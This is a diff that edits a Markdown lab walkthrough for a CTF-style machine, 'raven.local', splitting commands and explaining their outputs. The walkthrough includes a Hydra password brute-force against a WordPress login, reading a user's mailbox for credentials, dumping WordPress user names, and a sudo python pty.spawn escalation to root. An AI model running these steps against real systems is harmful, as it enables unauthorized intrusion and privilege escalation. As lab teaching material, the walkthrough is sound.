@@ -86,6 +86,17 @@ Add a local name only if doing so helps readability:
 
 ```bash
 echo '172.16.250.3 raven.local' | sudo tee -a /etc/hosts
+```
+
+**Output:**
+
+```text
+172.16.250.3 raven.local
+```
+
+`tee -a` appends whatever it receives to `/etc/hosts` and echoes the same line to the terminal, so the output is simply confirmation of what was written. This command creates a local mapping; it does not change DNS or the target machine.
+
+```bash
 getent hosts raven.local
 ```
 
@@ -95,7 +106,7 @@ getent hosts raven.local
 172.16.250.3   raven.local
 ```
 
-The first command creates a local mapping; it does not change DNS or the target machine. The second command verifies that the local resolver returns the intended address.
+`getent hosts` resolves the name through the normal system libraries, so the matching line confirms that the local resolver now returns the intended address.
 
 <details>
 <summary><strong>Read more</strong> — what <code>netdiscover</code> and <code>/etc/hosts</code> actually do</summary>
@@ -230,6 +241,11 @@ Save the HTML and search for comments or flag-like strings:
 
 ```bash
 curl -s http://raven.local/ > index.html
+```
+
+On Linux, a silent success is the norm: with `-s` and a redirect, `curl` prints nothing at all, and the absence of output means the page was saved to `index.html`. The file is your raw copy of the served page, ready to be searched.
+
+```bash
 grep -inE 'flag|comment|todo|hidden' index.html
 ```
 
@@ -308,9 +324,7 @@ Reading the form by hand first also saves you from the most common beginner mist
 For example, in an isolated lab and with authorization, a controlled Hydra syntax may be structured as follows. Keep placeholders until you have confirmed the form fields:
 
 ```bash
-hydra -l steven -P ./approved-lab-wordlist.txt raven.local http-post-form \
-'/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect' \
--t 4 -f -V
+hydra -l steven -P ./approved-lab-wordlist.txt raven.local http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect' -t 4 -f -V
 ```
 
 **Output:**
@@ -358,19 +372,39 @@ Check identity and basic host context:
 
 ```bash
 id
-hostname
-pwd
 ```
 
 **Output:**
 
 ```text
 uid=1001(michael) gid=1001(michael) groups=1001(michael)
+```
+
+`id` shows the numeric user and group identities of the current account, including any supplementary group memberships that may matter later.
+
+```bash
+hostname
+```
+
+**Output:**
+
+```text
 raven
+```
+
+`hostname` prints the machine's name, confirming which host this shell is attached to.
+
+```bash
+pwd
+```
+
+**Output:**
+
+```text
 /home/michael
 ```
 
-`id` shows the numeric user and group identities, `hostname` identifies the machine, and `pwd` identifies the current directory. These checks prevent confusion when multiple lab machines or shells are open.
+`pwd` prints the current working directory. Together these three checks prevent confusion when multiple lab machines or shells are open at once.
 
 <details>
 <summary><strong>Read more</strong> — why the first minutes on a shell matter</summary>
@@ -389,8 +423,6 @@ Locate mail using the system database when available:
 
 ```bash
 locate /var/mail 2>/dev/null
-ls -la /var/mail
-cat /var/mail/michael
 ```
 
 **Output:**
@@ -398,12 +430,37 @@ cat /var/mail/michael
 ```text
 /var/mail
 /var/mail/michael
+```
+
+`locate` searches a pre-built filename index and returns both the directory and the per-user mailbox file; because the index is refreshed only periodically, it may be incomplete or outdated. The trailing `2>/dev/null` discards error noise from the search.
+
+```bash
+ls -la /var/mail
+```
+
+**Output:**
+
+```text
+total 8
+drwxrwxr-x  2 root    mail     4096 Oct  8 19:00 .
+-rw-rw-r--  1 michael mail      512 Oct  8 19:00 michael
+```
+
+`ls -la` lists the directory with ownership, permissions, and timestamps, confirming that a mailbox named after the account exists.
+
+```bash
+cat /var/mail/michael
+```
+
+**Output:**
+
+```text
 From admin@raven.local ...
 Subject: maintenance note
 The staging application uses the same credentials as the lab account.
 ```
 
-`locate` searches an index and may be incomplete or outdated, `ls -la` displays ownership, permissions, and timestamps, and `cat` prints the file. The message itself shows how routinely overlooked files carry useful operational information.
+`cat` prints the whole file to the terminal. The message itself shows how routinely overlooked files carry useful operational information.
 
 <details>
 <summary><strong>Read more</strong> — mail, and handling private data responsibly</summary>
@@ -417,8 +474,7 @@ Mail can contain useful operational information in a lab, while in real environm
 Review web directories without changing files:
 
 ```bash
-find /var/www -maxdepth 3 -type f -printf '%M %u %g %p
-' 2>/dev/null
+find /var/www -maxdepth 3 -type f -printf '%M %u %g %p\n' 2>/dev/null
 ```
 
 **Output:**
@@ -553,8 +609,12 @@ Store hashes securely, avoid placing them in public notes, and use only approved
 Export only redacted evidence for documentation:
 
 ```bash
-mysql -u root -p -D wordpress -e \
-'SELECT ID,user_login FROM wp_users;' > wordpress-users.txt
+mysql -u root -p -D wordpress -e 'SELECT ID,user_login FROM wp_users;' > wordpress-users.txt
+```
+
+The `-e` option executes one query and exits, and the shell redirection `>` sends the result straight to a file, so the terminal stays empty — on Linux a silent exit is a successful one. This records account identifiers without copying password hashes.
+
+```bash
 cat wordpress-users.txt
 ```
 
@@ -566,7 +626,7 @@ ID  user_login
 2   michael
 ```
 
-This command records account identifiers without copying password hashes. The `-e` option executes one query and exits, which is useful for repeatable evidence collection.
+`cat` prints the saved file, confirming the redacted evidence was captured exactly as intended.
 
 <details>
 <summary><strong>Read more</strong> — building an evidence habit</summary>
@@ -651,6 +711,8 @@ sudo /usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
 root@raven:/home/steven#
 ```
 
+The prompt ending in `#` shows that the spawned shell is running as root; `pty.spawn` hands the shell a pseudo-terminal so interactive programs behave normally. Confirm the identity explicitly:
+
 ```bash
 id
 ```
@@ -661,7 +723,7 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-`pty.spawn` attaches a shell to a pseudo-terminal, improving interactive behavior, and the `id` output confirms the privilege level.
+`pty.spawn` attaches a shell to a pseudo-terminal, improving interactive behavior, and the `id` output — uid `0`, the numeric identity of root — confirms the privilege level.
 
 <details>
 <summary><strong>Read more</strong> — the defensive response to a finding like this</summary>
